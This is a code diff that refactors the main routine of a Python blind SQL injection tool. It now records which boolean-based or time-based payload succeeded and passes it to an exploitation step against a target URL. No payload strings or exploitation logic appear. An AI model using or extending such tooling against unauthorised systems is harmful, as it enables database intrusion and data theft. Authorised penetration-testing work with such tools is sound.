@@ -9,15 +9,17 @@ def main():
     parser = argparse.ArgumentParser(description="Automate blind SQL injection tasks.")
     parser.add_argument("target_url", help="The URL of the vulnerable endpoint to target")
     args = parser.parse_args()
-
-    id_value = extract_id(args.target_url)
+    target_url = args.target_url
+    id_value = extract_id(target_url)
     if id_value:
-        detected_vulnerabilities = []  # List to store detected vulnerability types
+        detected_vulnerabilities = []
+        exploitable_payloads = []
 
-        # Test for Boolean-based SQL injection
-        vulnerability_type = test_boolean_based_sql_injection(args.target_url, id_value)
+        vulnerability_type, exploitable_payload, default_response = test_boolean_based_sql_injection(target_url, id_value)
+        if exploitable_payload:
+            exploitable_payloads.append(exploitable_payload)
         if vulnerability_type == "boolean":
-            print("Boolean-based SQL injection vulnerability detected.")
+            print(f"Boolean-based SQL injection vulnerability detected with this payload: {exploitable_payload}.")
             detected_vulnerabilities.append("boolean")
         else:
             print("No Boolean-based SQL injection vulnerability detected.")
@@ -27,9 +29,10 @@ def main():
 
         if test_time_based == 'y':
             # Test for Time-based SQL injection if user agrees
-            time_based_vulnerability = test_time_based_sql_injection(args.target_url, id_value)
+            time_based_vulnerability, exploitable_payload = test_time_based_sql_injection(target_url, id_value)
+            exploitable_payloads.append(exploitable_payload)
             if time_based_vulnerability == "time-based":
-                print("Time-based SQL injection vulnerability detected.")
+                print(f"Time-based SQL injection vulnerability detected with this payload: {exploitable_payload}.")
                 detected_vulnerabilities.append("time-based")
             else:
                 print("No Time-based SQL injection vulnerability detected.")
@@ -50,8 +53,9 @@ def main():
                                 f"Choose a vulnerability to exploit (1-{len(detected_vulnerabilities)}): ").strip())
                             if 1 <= choice <= len(detected_vulnerabilities):
                                 selected_vulnerability = detected_vulnerabilities[choice - 1]
+                                ExploitablePayload = exploitable_payloads[choice - 1]
                                 print(f"Exploiting {selected_vulnerability} vulnerability...")
-                                start_exploitation(args.target_url, id_value, method=selected_vulnerability)
+                                start_exploitation(default_response, target_url, id_value, selected_vulnerability, ExploitablePayload)
                                 break  # Exit the inner loop after exploitation
                             else:
                                 print(
